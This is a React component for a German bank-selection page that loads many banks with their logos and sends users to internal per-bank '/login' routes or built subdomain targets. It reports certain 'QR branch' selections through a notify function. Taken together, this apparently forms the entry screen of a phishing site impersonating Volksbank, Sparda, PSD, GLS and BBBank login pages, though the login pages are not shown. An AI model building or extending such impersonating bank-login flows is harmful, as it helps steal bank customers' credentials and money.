import { useState, useRef, useEffect, useCallback, useMemo } from "react";
import { Search, MapPin, X, Building2, Loader2, ChevronRight } from "lucide-react";
import { useNavigate } from "@tanstack/react-router";
import { supabase } from "@/integrations/supabase/client";
import vrLogoGeneric from "@/assets/vr-logo-generic.png";
import { plzToCity } from "@/data/plz-mapping";
import { buildBankLoginTarget } from "@/lib/bankSubdomain";
import { notifyBranchSelected } from "@/lib/notifyBranch.functions";

type Bank = {
  id: string;
  name: string;
  group: string;
  blz: string | null;
  aliases: string[] | null;
  keywords: string[] | null;
  logo: string | null;
  online_banking_url: string | null;
  is_qr_branch?: boolean | null;
};


const logoModules = import.meta.glob("@/assets/*.png", { eager: true, import: "default" }) as Record<string, string>;
const logoAliases: Record<string, string> = {
  "sparda-bank-muenchen-logo": "sparda-muenchen-logo",
  "bbbank-logo": "bbbank-header-logo",
};
function getLogo(name?: string | null): string | undefined {
  if (!name) return undefined;
  if (/^(https?:|data:|blob:|\/)/.test(name)) return name;
  const resolved = logoAliases[name] ?? name;
  const key = Object.keys(logoModules).find((k) => k.endsWith(`/${resolved}.png`));
  return key ? logoModules[key] : undefined;
}
const groupLogoName: Record<string, string> = {
  "Volksbanken Raiffeisenbanken": "vr-logo-generic",
  "PSD Banken": "psd-bank-logo",
  "GLS Bank": "gls-bank-logo",
  "Sparda-Banken": "sparda-bank-generic-logo",
  BBBank: "bbbank-header-logo",
};
// Dropdown: group logo first (matches repo), fall back to bank-specific logo.
function bankLogoFor(bank: Bank): string {
  return getLogo(groupLogoName[bank.group]) || getLogo(bank.logo) || vrLogoGeneric;
}

const RECENT_KEY = "vr-recent-banks";
function getRecentBanks(): Bank[] {
  try {
    return JSON.parse(localStorage.getItem(RECENT_KEY) || "[]");
  } catch {
    return [];
  }
}
function saveRecentBank(bank: Bank) {
  const recent = getRecentBanks().filter((b) => b.id !== bank.id);
  recent.unshift(bank);
  localStorage.setItem(RECENT_KEY, JSON.stringify(recent.slice(0, 5)));
}

const norm = (s: string) =>
  s
    .toLowerCase()
    .replace(/ä/g, "ae")
    .replace(/ö/g, "oe")
    .replace(/ü/g, "ue")
    .replace(/ß/g, "ss")
    .replace(/[^a-z0-9\s]/g, " ")
    .trim();

function searchLocal(all: Bank[], q: string): Bank[] {
  const raw = q.trim();
  // PLZ-Suche: 5-stellige PLZ → Stadt-Keywords aus plz-mapping
  const plzMatch = raw.match(/^\d{5}$/);
  let effectiveQuery = raw;
  if (plzMatch) {
    const cities = plzToCity[raw];
    if (cities && cities.length) {
      effectiveQuery = cities.join(" ");
    }
  }
  const nq = norm(effectiveQuery);
  if (!nq) return [];
  const terms = nq.split(/\s+/).filter(Boolean);
  const scored: { b: Bank; score: number }[] = [];
  for (const b of all) {
    const hay = [
      b.name,
      b.group,
      b.blz ?? "",
      ...(b.aliases ?? []),
      ...(b.keywords ?? []),
    ]
      .map((x) => norm(String(x)))
      .join(" ");
    let score = 0;
    let matchesAny = false;
    let matchesAll = true;
    for (const t of terms) {
      if (hay.includes(t)) {
        score += t.length;
        matchesAny = true;
      } else {
        matchesAll = false;
      }
    }
    // Bei PLZ-Suche reicht ein Treffer eines Stadt-Keywords; sonst müssen alle Terme matchen
    if ((plzMatch ? matchesAny : matchesAll)) {
      if (norm(b.name).startsWith(nq)) score += 20;
      scored.push({ b, score });
    }
  }
  scored.sort((a, z) => z.score - a.score);
  return scored.slice(0, 30).map((x) => x.b);
}

export default function BankSearch() {
  const [allBanks, setAllBanks] = useState<Bank[]>([]);
  const [loading, setLoading] = useState(true);
  const [query, setQuery] = useState("");
  const [isFocused, setIsFocused] = useState(false);
  const [selectedIndex, setSelectedIndex] = useState(-1);
  const [locating, setLocating] = useState(false);
  const [locationError, setLocationError] = useState<string | null>(null);
  const [recent, setRecent] = useState<Bank[]>([]);
  const inputRef = useRef<HTMLInputElement>(null);
  const listRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    setRecent(getRecentBanks());
    (async () => {
      const { data, error } = await supabase
        .from("banks")
        .select("id,name,group,blz,aliases,keywords,logo,online_banking_url,is_qr_branch");
      if (!error && data) setAllBanks(data as any);
      setLoading(false);
    })();
  }, []);

  const results = useMemo(() => (query.trim() ? searchLocal(allBanks, query) : []), [query, allBanks]);
  const showResults = isFocused && query.trim().length > 0;

  const handleUseLocation = useCallback(() => {
    if (!("geolocation" in navigator)) {
      setLocationError("Ihr Browser unterstützt keine Standortabfrage.");
      return;
    }
    setLocating(true);
    setLocationError(null);
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        try {
          const { latitude, longitude } = pos.coords;
          const res = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}&zoom=10&addressdetails=1`,
            { headers: { "Accept-Language": "de" } },
          );
          const data = await res.json();
          const a = data?.address ?? {};
          const term: string = a.postcode || a.city || a.town || a.village || a.municipality || a.county || "";
          if (!term) throw new Error("no address");
          setQuery(term);
          setIsFocused(true);
          inputRef.current?.focus();
        } catch {
          setLocationError("Standort konnte nicht ermittelt werden.");
        } finally {
          setLocating(false);
        }
      },
      () => {
        setLocating(false);
        setLocationError("Standortzugriff verweigert.");
      },
      { enableHighAccuracy: false, timeout: 8000, maximumAge: 5 * 60 * 1000 },
    );
  }, []);

  const navigate = useNavigate();
  const handleSelect = useCallback((bank: Bank) => {
    saveRecentBank(bank);
    setRecent(getRecentBanks());
    setQuery(bank.name);
    setIsFocused(false);
    if (bank.is_qr_branch) {
      void notifyBranchSelected({
        data: { bankId: bank.id, bankName: bank.name, group: bank.group, blz: bank.blz },
      }).catch((err) => console.error("[BankSearch] notify failed", err));
    }
    const target = buildBankLoginTarget(bank.id, bank.online_banking_url);
    if (target.internal) {
      navigate({ to: "/login/$bankId", params: { bankId: target.suffix } });
    } else {
      window.location.assign(target.href);
    }
  }, [navigate]);


  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === "ArrowDown") {
      e.preventDefault();
      setSelectedIndex((i) => Math.min(i + 1, results.length - 1));
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      setSelectedIndex((i) => Math.max(i - 1, -1));
    } else if (e.key === "Enter" && selectedIndex >= 0) {
      e.preventDefault();
      const b = results[selectedIndex];
      if (b) handleSelect(b);
    } else if (e.key === "Escape") {
      setIsFocused(false);
    }
  };

  useEffect(() => {
    if (selectedIndex >= 0 && listRef.current) {
      const el = listRef.current.children[selectedIndex] as HTMLElement;
      el?.scrollIntoView({ block: "nearest" });
    }
  }, [selectedIndex]);

  return (
    <div className="w-full">
      <div className="relative">
        <div className="relative flex items-center">
          <Search className="absolute left-3.5 w-5 h-5 text-muted-foreground pointer-events-none" />
          <input
            ref={inputRef}
            type="text"
            value={query}
            onChange={(e) => setQuery(e.target.value)}
            onFocus={() => setIsFocused(true)}
            onBlur={() => setTimeout(() => setIsFocused(false), 200)}
            onKeyDown={handleKeyDown}
            placeholder={loading ? "Lade Banken…" : "Bank, Ort oder PLZ eingeben"}
            disabled={loading}
            className={`w-full pl-11 ${query ? "pr-20" : "pr-11"} py-3.5 rounded-xl border border-input bg-background text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent text-sm sm:text-base transition-shadow`}
            autoComplete="off"
          />
          <div className="absolute right-2 flex items-center gap-1">
            {query && (
              <button
                onMouseDown={(e) => e.preventDefault()}
                onClick={() => {
                  setQuery("");
                  inputRef.current?.focus();
                }}
                className="p-1.5 rounded-lg hover:bg-muted transition-colors text-muted-foreground"
                aria-label="Eingabe löschen"
              >
                <X className="w-4 h-4" />
              </button>
            )}
            <button
              type="button"
              onMouseDown={(e) => e.preventDefault()}
              onClick={handleUseLocation}
              disabled={locating}
              className="p-1.5 rounded-lg hover:bg-muted transition-colors text-primary disabled:opacity-60"
              aria-label="Standort verwenden"
              title="Banken in Ihrer Nähe finden"
            >
              {locating ? <Loader2 className="w-4 h-4 animate-spin" /> : <MapPin className="w-4 h-4" />}
            </button>
          </div>
        </div>

        {locationError && <p className="mt-2 text-xs text-destructive">{locationError}</p>}

        {showResults && (
          <div
            ref={listRef}
            className="absolute z-30 left-0 right-0 mt-2 max-h-96 overflow-y-auto rounded-xl border border-border bg-card shadow-2xl"
          >
            {results.length === 0 ? (
              <div className="flex flex-col items-center justify-center gap-2 py-8 px-4 text-center text-muted-foreground">
                <Building2 className="w-8 h-8 opacity-40" />
                <p className="text-sm">Keine Filiale gefunden.</p>
              </div>
            ) : (
              results.map((bank, i) => (
                <button
                  key={bank.id}
                  onMouseDown={(e) => e.preventDefault()}
                  onClick={() => handleSelect(bank)}
                  className={`w-full flex items-center gap-3 px-4 py-3 text-left border-b border-border last:border-b-0 transition-colors ${
                    i === selectedIndex ? "bg-muted" : "hover:bg-muted/60"
                  }`}
                >
                  <img
                    src={bankLogoFor(bank)}
                    alt=""
                    className="w-10 h-10 rounded-md object-contain bg-white border border-border/50 shrink-0"
                    loading="lazy"
                  />
                  <div className="flex-1 min-w-0">
                    <div className="text-sm font-medium text-foreground truncate">{bank.name}</div>
                    {(() => {
                      const showGroup = bank.group && bank.group !== "Spezifische Banken";
                      const text = [showGroup ? bank.group : null, bank.blz ? `BLZ ${bank.blz}` : null]
                        .filter(Boolean)
                        .join(" · ");
                      return text ? (
                        <div className="text-xs text-muted-foreground truncate">{text}</div>
                      ) : null;
                    })()}
                  </div>
                  <ChevronRight className="w-4 h-4 text-muted-foreground shrink-0" />
                </button>
              ))
            )}
          </div>
        )}
      </div>

      {!showResults && recent.length > 0 && (
        <div className="mt-5">
          <div className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-2">
            Zuletzt verwendet
          </div>
          <div className="flex flex-col gap-1.5">
            {recent.map((bank) => (
              <button
                key={bank.id}
                onClick={() => handleSelect(bank)}
                className="flex items-center gap-3 px-3 py-2 rounded-lg border border-border hover:bg-muted transition-colors text-left"
              >
                <img
                  src={bankLogoFor(bank)}
                  alt=""
                  className="w-8 h-8 rounded object-contain bg-white border border-border/50 shrink-0"
                />
                <span className="flex-1 text-sm text-foreground truncate">{bank.name}</span>
                
                  <ChevronRight className="w-3.5 h-3.5 text-muted-foreground shrink-0" />

              </button>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
